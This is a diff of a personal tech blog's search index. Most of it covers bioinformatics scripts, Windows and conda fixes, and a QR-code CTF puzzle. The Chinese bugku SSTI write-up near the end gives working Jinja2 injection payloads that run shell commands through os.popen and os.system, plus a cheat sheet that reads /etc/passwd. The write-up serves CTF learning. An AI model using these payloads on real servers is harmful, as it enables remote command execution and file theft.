class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> SeqIO.parse(<span class="string">&#x27;temp_aligned.fasta&#x27;</span>, <span class="string">&#x27;fasta&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(_.<span class="built_in">id</span>) == <span class="string">&#x27;query&#x27;</span>:</span><br><span class="line">                    aligned_query = <span class="built_in">str</span>(_.seq)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(_.<span class="built_in">id</span>) == <span class="string">&#x27;ref&#x27;</span>:</span><br><span class="line">                    aligned_ref = <span class="built_in">str</span>(_.seq)</span><br><span class="line"></span><br><span class="line">            mutation = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(aligned_query, aligned_ref) <span class="keyword">if</span> a != b <span class="keyword">and</span> <span class="keyword">not</span> a == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> <span class="keyword">not</span> b == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            insertion = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(aligned_query, aligned_ref) <span class="keyword">if</span> a != <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> b == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            deletion = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(aligned_query, aligned_ref) <span class="keyword">if</span> a == <span class="string">&#x27;-&#x27;</span> <span class="keyword">and</span> b != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            id_list.append(<span class="string">f&#x27;<span class="subst">&#123;idx&#125;</span>_<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            mutation_list.append(<span class="built_in">round</span>(mutation/<span class="built_in">len</span>(ref) ,<span class="number">4</span>))</span><br><span class="line">            insertion_list.append(<span class="built_in">round</span>(insertion/<span class="built_in">len</span>(ref) ,<span class="number">4</span>))</span><br><span class="line">            deletion_list.append(<span class="built_in">round</span>(deletion/<span class="built_in">len</span>(ref) ,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">            pbar.update()</span><br><span class="line">    all_mutation_list += mutation_list</span><br><span class="line">    all_insertion_list += insertion_list</span><br><span class="line">    all_deletion_list += deletion_list</span><br><span class="line">    all_id_list += id_list</span><br><span class="line"></span><br><span class="line">    avg_mutation = <span class="built_in">round</span>(<span class="built_in">sum</span>(mutation_list)/<span class="built_in">len</span>(mutation_list), <span class="number">4</span>)</span><br><span class="line">    avg_mutation_list.append(avg_mutation)</span><br><span class="line">    avg_insertion = <span class="built_in">round</span>(<span class="built_in">sum</span>(insertion_list)/<span class="built_in">len</span>(insertion_list), <span class="number">4</span>)</span><br><span class="line">    avg_insertion_list.append(avg_insertion)</span><br><span class="line">    avg_deletion = <span class="built_in">round</span>(<span class="built_in">sum</span>(deletion_list)/<span class="built_in">len</span>(deletion_list), <span class="number">4</span>)</span><br><span class="line">    avg_deletion_list.append(avg_deletion)</span><br><span class="line">    avg_id_list.append(<span class="string">f&#x27;<span class="subst">&#123;idx&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\nGrouped seqs <span class="subst">&#123;idx&#125;</span> error rate:\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;mutation rate : <span class="subst">&#123;avg_mutation&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;insertion rate : <span class="subst">&#123;avg_insertion&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;deletion rate : <span class="subst">&#123;avg_deletion&#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df_all = pd.DataFrame(&#123;<span class="string">&#x27;mutation&#x27;</span>:all_mutation_list,<span class="string">&#x27;insertion&#x27;</span>:all_insertion_list,<span class="string">&#x27;deletion&#x27;</span>:all_deletion_list&#125;,index=all_id_list)</span><br><span class="line">df_all.to_csv(<span class="string">&#x27;all error rate.csv&#x27;</span>)</span><br><span class="line">df_avg = pd.DataFrame(&#123;<span class="string">&#x27;mutation&#x27;</span>:avg_mutation_list,<span class="string">&#x27;insertion&#x27;</span>:avg_insertion_list,<span class="string">&#x27;deletion&#x27;</span>:avg_deletion_list&#125;,index=avg_id_list)</span><br><span class="line">df_avg.to_csv(<span class="string">&#x27;avg error rate.csv&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Saved file like below:</p>
+<table>
+<thead>
+<tr>
+<th align="center">index</th>
+<th align="center">mutation rate</th>
+<th align="center">insertion rate</th>
+<th align="center">deletion rate</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">0.0492</td>
+<td align="center">0.0175</td>
+<td align="center">0.0605</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">0.0405</td>
+<td align="center">0.0167</td>
+<td align="center">0.0496</td>
+</tr>
+<tr>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td align="center">0.0434</td>
+<td align="center">0.0208</td>
+<td align="center">0.0598</td>
+</tr>
+<tr>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+<td align="center">…</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+        <tag>Problems</tag>
+        <tag>English</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Microsoft store pages cannot be loaded</title>
+    <url>/2023/12/11/ec76492d440d/</url>
+    <content><![CDATA[<h2 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h2><p>Regardless of whether the proxy is turned on or not, the MS store pages cannot be loaded correctly in Windows 11.</p>
+<p><img src="/2023/12/11/ec76492d440d/0fd15f83-1f62-4975-8493-70517e921a00.png" alt="0fd15f83-1f62-4975-8493-70517e921a00"></p>
+<span id="more"></span>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Open Powershell as administrator and enter</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foreach (<span class="variable">$n</span> <span class="keyword">in</span> (get-appxpackage).packagefamilyname) &#123;checknetisolation loopbackexempt -a -n=<span class="string">&quot;<span class="variable">$n</span>&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Wait for execution to complete.</p>
+<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p><a href="https://zhuanlan.zhihu.com/p/116654088">https://zhuanlan.zhihu.com/p/116654088</a></p>
+<p>In the comment of this article, @云间夏 showed this solution.</p>
+<p>Thanks! ❤</p>
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Problems</tag>
+        <tag>English</tag>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>OSerror</title>
+    <url>/2022/09/26/21709eccd78d/</url>
+    <content><![CDATA[<h2 id="Problems-encountered-on-26-x2F-09-x2F-2022"><a href="#Problems-encountered-on-26-x2F-09-x2F-2022" class="headerlink" title="Problems encountered on 26&#x2F;09&#x2F;2022"></a>Problems encountered on 26&#x2F;09&#x2F;2022</h2><h3 id="Problem-Situation"><a href="#Problem-Situation" class="headerlink" title="Problem Situation"></a>Problem Situation</h3><p>When I tried to run baseLess, an error occured：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/bin/baseLess&quot;</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    sys.exit(main())</span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/lib/python3.10/site-packages/baseLess/__main__.py&quot;</span>, line <span class="number">55</span>, <span class="keyword">in</span> main</span><br><span class="line">    args.func(args)</span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/lib/python3.10/site-packages/baseLess/db_building/build_db.py&quot;</span>, line <span class="number">44</span>, <span class="keyword">in</span> main</span><br><span class="line">    tr = TrainingRead(f, normalization=args.normalization,</span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/lib/python3.10/site-packages/baseLess/db_building/TrainingRead.py&quot;</span>, line <span class="number">74</span>, <span class="keyword">in</span> __init__</span><br><span class="line">    self.raw = <span class="literal">None</span></span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/lib/python3.10/site-packages/baseLess/db_building/TrainingRead.py&quot;</span>, line <span class="number">163</span>, <span class="keyword">in</span> raw</span><br><span class="line">    raw = self.hdf[<span class="string">f&#x27;Raw/Reads/<span class="subst">&#123;raw_varname&#125;</span>/Signal&#x27;</span>][()]</span><br><span class="line">  File <span class="string">&quot;h5py/_objects.pyx&quot;</span>, line <span class="number">54</span>, <span class="keyword">in</span> h5py._objects.with_phil.wrapper</span><br><span class="line">  File <span class="string">&quot;h5py/_objects.pyx&quot;</span>, line <span class="number">55</span>, <span class="keyword">in</span> h5py._objects.with_phil.wrapper</span><br><span class="line">  File <span class="string">&quot;/home/zxy/anaconda3/envs/baseLess/lib/python3.10/site-packages/h5py/_hl/dataset.py&quot;</span>, line <span class="number">710</span>, <span class="keyword">in</span> __getitem__</span><br><span class="line">    <span class="keyword">return</span> self._fast_reader.read(args)</span><br><span class="line">  File <span class="string">&quot;h5py/_selector.pyx&quot;</span>, line <span class="number">366</span>, <span class="keyword">in</span> h5py._selector.Reader.read</span><br><span class="line">OSError: Can<span class="string">&#x27;t read data (can&#x27;</span>t <span class="built_in">open</span> directory: /home/zxy/anaconda3/envs/baseLess/lib/hdf5/plugin)</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p>Install hdfplugin with command<code>conda install ont_vbz_hdf_plugin</code></p>
+<p>But an error：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Collecting package metadata (current_repodata.json): done</span><br><span class="line">Solving environment: failed <span class="keyword">with</span> initial frozen solve. Retrying <span class="keyword">with</span> flexible solve.</span><br><span class="line">Collecting package metadata (repodata.json): done</span><br><span class="line">Solving environment: failed <span class="keyword">with</span> initial frozen solve. Retrying <span class="keyword">with</span> flexible solve.</span><br><span class="line"></span><br><span class="line">PackagesNotFoundError: The following packages are <span class="keyword">not</span> available <span class="keyword">from</span> current channels:</span><br><span class="line"></span><br><span class="line">  - ont_vbz_hdf_plugin</span><br><span class="line"></span><br><span class="line">Current channels:</span><br><span class="line"></span><br><span class="line">  - https://mirrors.sustech.edu.cn/anaconda/pkgs/main/linux-<span class="number">64</span></span><br><span class="line">  - https://mirrors.sustech.edu.cn/anaconda/pkgs/main/noarch</span><br><span class="line">  - https://mirrors.sustech.edu.cn/anaconda/pkgs/free/linux-<span class="number">64</span></span><br><span class="line">  - https://mirrors.sustech.edu.cn/anaconda/pkgs/free/noarch</span><br><span class="line">  - https://repo.anaconda.com/pkgs/main/linux-<span class="number">64</span></span><br><span class="line">  - https://repo.anaconda.com/pkgs/main/noarch</span><br><span class="line">  - https://repo.anaconda.com/pkgs/r/linux-<span class="number">64</span></span><br><span class="line">  - https://repo.anaconda.com/pkgs/r/noarch</span><br><span class="line"></span><br><span class="line">To search <span class="keyword">for</span> alternate channels that may provide the conda package yo<span class="string">u&#x27;re</span></span><br><span class="line"><span class="string">looking for, navigate to</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    https://anaconda.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and use the search bar at the top of the page.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Final-solution"><a href="#Final-solution" class="headerlink" title="Final solution"></a>Final solution</h3><p>With this command <code>conda install -c bioconda ont_vbz_hdf_plugin</code></p>
+<p>Details:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(baseLess) zxy@biolab-HP-Z8-G4-Workstation:~$ conda install -c bioconda ont_vbz_hdf_plugin</span><br><span class="line">Collecting package metadata (current_repodata.json): done</span><br><span class="line">Solving environment: done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt; WARNING: A newer version of conda exists. &lt;==</span><br><span class="line">  current version: <span class="number">4.12</span><span class="number">.0</span></span><br><span class="line">  latest version: <span class="number">4.14</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">Please update conda by running</span><br><span class="line"></span><br><span class="line">    $ conda update -n base -c defaults conda</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Package Plan ##</span></span><br><span class="line"></span><br><span class="line">  environment location: /home/zxy/anaconda3/envs/baseLess</span><br><span class="line"></span><br><span class="line">  added / updated specs:</span><br><span class="line">    - ont_vbz_hdf_plugin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The following packages will be downloaded:</span><br><span class="line"></span><br><span class="line">    package                    |            build</span><br><span class="line">    ---------------------------|-----------------</span><br><span class="line">    ont_vbz_hdf_plugin-<span class="number">1.0</span><span class="number">.1</span>   |       hb6da537_3         <span class="number">1.3</span> MB  bioconda</span><br><span class="line">    ------------------------------------------------------------</span><br><span class="line">                                           Total:         <span class="number">1.3</span> MB</span><br><span class="line"></span><br><span class="line">The following NEW packages will be INSTALLED:</span><br><span class="line"></span><br><span class="line">  ont_vbz_hdf_plugin bioconda/linux-<span class="number">64</span>::ont_vbz_hdf_plugin-<span class="number">1.0</span><span class="number">.1</span>-hb6da537_3</span><br><span class="line"></span><br><span class="line">The following packages will be SUPERSEDED by a higher-priority channel:</span><br><span class="line"></span><br><span class="line">  openssl            conda-forge::openssl-<span class="number">1.1</span><span class="number">.1</span>q-h166bdaf_0 --&gt; anaconda/pkgs/main::openssl-<span class="number">1.1</span><span class="number">.1</span>q-h7f8727e_0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Proceed ([y]/n)? y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Downloading <span class="keyword">and</span> Extracting Packages</span><br><span class="line">ont_vbz_hdf_plugin-<span class="number">1</span> | <span class="number">1.3</span> MB    | <span class="comment">##################################################################################################################################### | 100%</span></span><br><span class="line">Preparing transaction: done</span><br><span class="line">Verifying transaction: done</span><br><span class="line">Executing transaction: done</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Tech</category>
+      </categories>
+      <tags>
+        <tag>Bioinformatics</tag>
+        <tag>Problems</tag>
+        <tag>English</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Story of 1 and 2</title>
+    <url>/2023/11/07/fb19166d5adf/</url>
+    <content><![CDATA[<h1 id="Story-of-1-and-2-bugku-challenge"><a href="#Story-of-1-and-2-bugku-challenge" class="headerlink" title="Story of 1 and 2 - bugku challenge"></a>Story of 1 and 2 - <a href="https://ctf.bugku.com/">bugku</a> challenge</h1><h2 id="Basic-Information-about-the-challenge"><a href="#Basic-Information-about-the-challenge" class="headerlink" title="Basic Information about the challenge"></a>Basic Information about the challenge</h2><ul>
+<li>link: <a href="https://ctf.bugku.com/challenges/detail/id/216.html">https://ctf.bugku.com/challenges/detail/id/216.html</a></li>
+<li>Title: Story of 1 and 2</li>
+<li>detail: same as title<span id="more"></span></li>
+</ul>
+<h2 id="File"><a href="#File" class="headerlink" title="File"></a>File</h2><p>In this challenge, we got a file named ‘1和0的故事.txt’, whose content is as follows:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0000000001110010000000000</span><br><span class="line">0000000000011110100000000</span><br><span class="line">0000000001110001000000000</span><br><span class="line">0000000010111100000000000</span><br><span class="line">0000000010101010000000000</span><br><span class="line">0000000001100010100000000</span><br><span class="line">0000000010101010100000000</span><br><span class="line">0000000001000001100000000</span><br><span class="line">1100011101110110100011000</span><br><span class="line">0001000010110010010010100</span><br><span class="line">0100111101000011101110011</span><br><span class="line">0011110100101011001001001</span><br><span class="line">1000001001100001001101000</span><br><span class="line">1111000111111011100101000</span><br><span class="line">1011011111001101111110111</span><br><span class="line">1000110110010010101101100</span><br><span class="line">1000111100111111111110111</span><br><span class="line">0000000010110001100010100</span><br><span class="line">0000000010010100101010001</span><br><span class="line">0000000010101010100011001</span><br><span class="line">0000000000100111111110010</span><br><span class="line">0000000000011001011110111</span><br><span class="line">0000000001001100100100001</span><br><span class="line">0000000011000011011011001</span><br><span class="line">0000000011010000101110101</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solving-process"><a href="#Solving-process" class="headerlink" title="Solving process"></a>Solving process</h2><p>This file looks like a QR code, and the 0 and 1 easily remind us of black and white.</p>
+<p>So we wrote python script to recover QR code.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1和0的故事.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data  = f.readlines()</span><br><span class="line"></span><br><span class="line">data = [[<span class="built_in">int</span>(m) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">list</span>(line)] <span class="keyword">for</span> line <span class="keyword">in</span> [i.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> data]]</span><br><span class="line">data = np.array(data)</span><br><span class="line"></span><br><span class="line">width = height = <span class="number">125</span></span><br><span class="line">time = <span class="number">5</span> <span class="comment"># image in proper scale</span></span><br><span class="line"></span><br><span class="line">img = np.zeros([width, height, <span class="number">3</span>], dtype=np.uint8)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width//time):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height//time):</span><br><span class="line">            value = <span class="number">0</span> <span class="keyword">if</span> data[i, j] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">            img[i*time:i*time+time, j*time:j*time+time, :] = [value * <span class="number">255</span>, value * <span class="number">255</span>, value * <span class="number">255</span>]</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&quot;qrcode.jpg&quot;</span>, img)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Ran the script and we got an image like this:</p>
+<p><img src="/2023/11/07/fb19166d5adf/image-20231106234804659.png" alt="image-20231106234804659"></p>
+<p>but it seems like we lost the position like shown below.</p>
+<blockquote>
+<p><img src="/2023/11/07/fb19166d5adf/1920px-QR_Code_Structure_Example_3.svg.png" alt="undefined"></p>
+<p>source: <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/QR_Code_Structure_Example_3.svg/1920px-QR_Code_Structure_Example_3.svg.png">wikipedia</a></p>
+</blockquote>
+<p>There were so many methods to add on the position, like PhotoShop etc.</p>
+<p>I chose to modify the txt file to this:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1111111001110010001111111</span><br><span class="line">1000001000011110101000001</span><br><span class="line">1011101001110001001011101</span><br><span class="line">1011101010111100001011101</span><br><span class="line">1011101010101010001011101</span><br><span class="line">1000001001100010101000001</span><br><span class="line">1111111010101010101111111</span><br><span class="line">0000000001000001100000000</span><br><span class="line">1100011101110110100011000</span><br><span class="line">0001000010110010010010100</span><br><span class="line">0100111101000011101110011</span><br><span class="line">0011110100101011001001001</span><br><span class="line">1000001001100001001101000</span><br><span class="line">1111000111111011100101000</span><br><span class="line">1011011111001101111110111</span><br><span class="line">1000110110010010101101100</span><br><span class="line">1000111100111111111110111</span><br><span class="line">0000000010110001100010100</span><br><span class="line">1111111010010100101010001</span><br><span class="line">1000001010101010100011001</span><br><span class="line">1011101000100111111110010</span><br><span class="line">1011101000011001011110111</span><br><span class="line">1011101001001100100100001</span><br><span class="line">1000001011000011011011001</span><br><span class="line">1111111011010000101110101</span><br></pre></td></tr></table></figure>
+
+<p>then we ran again and got the correct QR code.</p>
+<p><img src="/2023/11/07/fb19166d5adf/image-20231106235557038.png" alt="image-20231106235557038"></p>
+<p>Submit it to any QR code recognition website such as <a href="https://webqr.com/">this one</a>, and we got the flag.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;QR_c0de_1s_1nterest1n9&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>English</tag>
+        <tag>Misc</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku的Simple_SSTI_1&amp;2</title>
+    <url>/2023/11/04/d308653fd0c0/</url>
+    <content><![CDATA[<h2 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a><a href="httpsctf.bugku.comchallengesdetailid196.html">Simple_SSTI_1</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>没有描述，题目描述与题目名称一致。</p>
+<h3 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h3><p>首先进入环境，发现仅有一句话：</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014117763.png" alt="image-20231105014117763"></p>
+<p>F12查看元素，发现一具友好的注释</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- You know, in the flask, We often set a secret_key variable.--&gt;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>简单的模板注入。</p>
+<p>结合两处信息，提交flag：</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014126054.png" alt="image-20231105014126054"></p>
+<p>即可得到<code>flag&#123;f55da1a9d9333c39872e420b76d7e3f2&#125;</code></p>
+<h2 id="Simple-SSTI-2"><a href="#Simple-SSTI-2" class="headerlink" title="Simple_SSTI_2"></a><a href="httpsctf.bugku.comchallengesdetailid203.html">Simple_SSTI_2</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>没有描述，题目描述与题目名称一致。</p>
+<h3 id="解决过程-1"><a href="#解决过程-1" class="headerlink" title="解决过程"></a>解决过程</h3><p>进入环境，页面显示与Simple_SSTI_1一致，但网页元素却有了区别</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Simple SSTI2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">You need pass in a parameter named flag</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这道题没有任何提示，尝试使用Simple_SSTI_1的解法，构建<code>http114.67.175.22415921flag=&#123;&#123;config&#125;&#125;</code>，返回如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Config &#123;<span class="string">&#x27;ENV&#x27;</span>: <span class="string">&#x27;production&#x27;</span>, <span class="string">&#x27;DEBUG&#x27;</span>: True, <span class="string">&#x27;TESTING&#x27;</span>: False, <span class="string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: None, <span class="string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: None, <span class="string">&#x27;SECRET_KEY&#x27;</span>: None, <span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: datetime.timedelta(days=31), <span class="string">&#x27;USE_X_SENDFILE&#x27;</span>: False, <span class="string">&#x27;SERVER_NAME&#x27;</span>: None, <span class="string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: None, <span class="string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: None, <span class="string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: True, <span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: False, <span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>: None, <span class="string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: True, <span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: None, <span class="string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: datetime.timedelta(seconds=43200), <span class="string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: None, <span class="string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: False, <span class="string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: False, <span class="string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;JSON_AS_ASCII&#x27;</span>: True, <span class="string">&#x27;JSON_SORT_KEYS&#x27;</span>: True, <span class="string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: False, <span class="string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>, <span class="string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: None, <span class="string">&#x27;MAX_COOKIE_SIZE&#x27;</span>: 4093&#125;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>并没有特殊之处。</p>
+<p>构建<code>http://114.67.175.224:15921/?flag=&#123;&#123;13&#125;&#125;</code>得到返回 <code>13</code>，并且想到题目说SSTI漏洞，可以考虑构建命令注入查看文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).<span class="built_in">read</span>()&#125;&#125;</span><br><span class="line">或</span><br><span class="line">http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回了</p>
+<p><img src="/2023/11/04/d308653fd0c0/image-20231105014134737.png" alt="image-20231105014134737"></p>
+<p>看到了flag，更换命令重新注入</p>
+<p><code>http://114.67.175.224:15921/?flag=&#123;&#123;config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20flag%27).read()&#125;&#125;</code></p>
+<p>得到<code>flag&#123;69f88b1ab5884cd258662ac7a3fe02d8&#125;</code></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="什么是SSTI"><a href="#什么是SSTI" class="headerlink" title="什么是SSTI"></a>什么是SSTI</h3><p>SSTI （Server-Side Template Injection），即模板注入。</p>
+<p> 模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
+<h3 id="常见的测试用例-（转自Web安全学习笔记）"><a href="#常见的测试用例-（转自Web安全学习笔记）" class="headerlink" title="常见的测试用例 （转自Web安全学习笔记）"></a>常见的测试用例 （转自<a href="httpswebsec.readthedocs.iozhlatestvulnssti.html">Web安全学习笔记</a>）</h3><ul>
+<li><p>简单数学表达式 <code>&#123;&#123; 1+1 &#125;&#125; </code></p>
+</li>
+<li><p>字符串表达式 <code>&#123;&#123;'test'&#125;&#125;</code></p>
+</li>
+<li><p>Flask  Jinja2（本题为Jinja2）<br> <code>&#123;&#123; config &#125;&#125;</code><br> <code>&#123;&#123; config.items() &#125;&#125;</code><br> <code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code><br> <code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;</code><br> <code>&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;</code><br> <code>&#123;&#123; request.__init__.__globals__['__builtins__'].open('etcpasswd').read() &#125;&#125;</code></p>
+</li>
+<li><p>Django</p>
+<ul>
+<li><code>&#123;&#123; request &#125;&#125;</code></li>
+<li><code>&#123;% debug %&#125;</code></li>
+<li><code>&#123;% load module %&#125;</code></li>
+<li><code>&#123;% include x.html %&#125;</code></li>
+<li><code>&#123;% extends x.html %&#125;</code></li>
+</ul>
+</li>
+<li><p>Ruby</p>
+<ul>
+<li><code>&lt;%= 7 * 7 %&gt;</code></li>
+<li><code>&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;</code></li>
+</ul>
+</li>
